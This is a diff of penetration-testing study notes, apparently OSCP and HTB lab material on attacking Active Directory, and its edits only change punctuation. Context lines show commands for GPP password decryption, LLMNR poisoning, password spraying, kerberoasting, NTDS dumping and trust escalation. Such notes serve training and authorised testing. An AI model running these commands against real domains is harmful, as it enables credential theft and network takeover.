@@ -65,9 +65,9 @@ gpp-decrypt "<cpassword_base64>"
 ```
 
 Key things to look for in shares:
-- `cpassword` in any XML under SYSVOL (GPP passwords — AES key is public, decryptable)
+- `cpassword` in any XML under SYSVOL (GPP passwords. AES key is public, decryptable)
 - Config files, scripts, `.txt` files with credentials in custom shares (docshare, Users, backup)
-- Folders named "do-not-share" — almost always misconfigured and very much shared
+- Folders named "do-not-share", almost always misconfigured and very much shared
 
 Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]
 
@@ -92,7 +92,7 @@ Get-NetSession -ComputerName <target>    # blocked on Win10 1709+/Server 2019+ f
 >
 > After Find-LocalAdminAccess finds a machine you have admin on: if a high-value user (e.g. Domain Admin) is logged in there (via PsLoggedOn), that machine is your credential theft target.
 >
-> **UAC token filtering gotcha**: when you RDP to a machine as a domain user who is a local admin, the session has a filtered token — direct paths like `C:\Users\Administrator\Desktop\` are access denied. Use UNC admin shares from a different machine instead: `type "\\target\c$\Users\administrator\Desktop\proof.txt"`
+> **UAC token filtering gotcha**: when you RDP to a machine as a domain user who is a local admin, the session has a filtered token, direct paths like `C:\Users\Administrator\Desktop\` are access denied. Use UNC admin shares from a different machine instead: `type "\\target\c$\Users\administrator\Desktop\proof.txt"`
 
 #### Step 6: Permissions
 ```powershell
@@ -203,7 +203,7 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 Snaffler.exe -d DOMAIN.LOCAL -s -v data
 ```
 
-Full reference: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler — Automated Interesting-File Finder|PA.17.4]] (per-host), [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.7.2. Snaffler Domain-Wide Scan|AD.7.2]] (domain-wide)
+Full reference: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler. Automated Interesting-File Finder|PA.17.4]] (per-host), [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.7.2. Snaffler Domain-Wide Scan|AD.7.2]] (domain-wide)
 
 ---
 
@@ -223,7 +223,7 @@ kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-ne
 ```
 Valid usernames returned by kerbrute (Kerberos says "pre-auth required" vs "no such user") are safe to spray.
 
-Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute — Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
+Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute. Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
 
 #### Tags: #kerbrute #usernameAnarchy #ADEnumeration #HTBSupplementary
 
@@ -257,7 +257,7 @@ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 # Ctrl+C to stop; read captures: type Inveigh-NTLMv2.txt
 ```
 
-Crack captures with `hashcat -m 5600`. Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.3. LLMNR/NBT-NS Poisoning from Windows — Inveigh|AD.3]]
+Crack captures with `hashcat -m 5600`. Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.3. LLMNR/NBT-NS Poisoning from Windows. Inveigh|AD.3]]
 
 #### Step 2: Password Spraying
 
@@ -289,7 +289,7 @@ Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -Erro
 
 > Module 23 lesson: crackmapexec -u pete spray across all subnet IPs reveals (Pwn3d!) where pete is local admin. Use `--continue-on-success` and spray a whole subnet: one valid cred might give local admin on a box the sprayer didn't expect.
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows — DomainPasswordSpray|AD.5]], [[Attacking Active Directory Authentication#23.2.1 Password Attacks (Spraying)|Module 23 §23.2.1]]
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows. DomainPasswordSpray|AD.5]], [[Attacking Active Directory Authentication#23.2.1 Password Attacks (Spraying)|Module 23 §23.2.1]]
 
 #### Step 3: AS-REP Roasting
 ```bash
@@ -315,9 +315,9 @@ impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user -outputfile hashes.
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
-> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW` — `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[feedback-oscp-kerberos-clock-sync]].
+> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[feedback-oscp-kerberos-clock-sync]].
 >
-> Rubeus over evil-winrm fails with "No credentials are available in the security package" — evil-winrm authenticates via NTLM so there's no Kerberos TGT in the session. Use impacket from Kali instead.
+> Rubeus over evil-winrm fails with "No credentials are available in the security package", evil-winrm authenticates via NTLM so there's no Kerberos TGT in the session. Use impacket from Kali instead.
 
 #### Step 5: Pass-the-Hash
 ```bash
@@ -396,7 +396,7 @@ nxc smb <target> -u user -p pass --lsa
 nxc smb <dc_ip>  -u user -p pass --ntds
 ```
 
-**Snaffler** (share and file credential hunting — run from domain-joined machine):
+**Snaffler** (share and file credential hunting, run from domain-joined machine):
 ```cmd
 .\Snaffler.exe -d <domain> -o snaffler_output.log -v data
 ```
@@ -439,7 +439,7 @@ kinit <user>@DOMAIN -k -t <file.keytab>
 # Use it
 smbclient -k -N //<target>/share
 ```
-Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket — Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket — Linux|PA.16]]
+Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket. Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket. Linux|PA.16]]
 
 #### Step 3: Golden Ticket
 ```cmd
@@ -640,14 +640,14 @@ klist
 rem Verify: ls \\parentdc.parent.local\c$
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows — ExtraSids)|AD.16]]
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16]]
 
 **Linux — raiseChild.py (automated):**
 ```bash
 impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Administrator:pass
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux — raiseChild.py)|AD.17]]
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux, raiseChild.py)|AD.17]]
 
 #### Step 3: Cross-Forest Kerberoasting
 
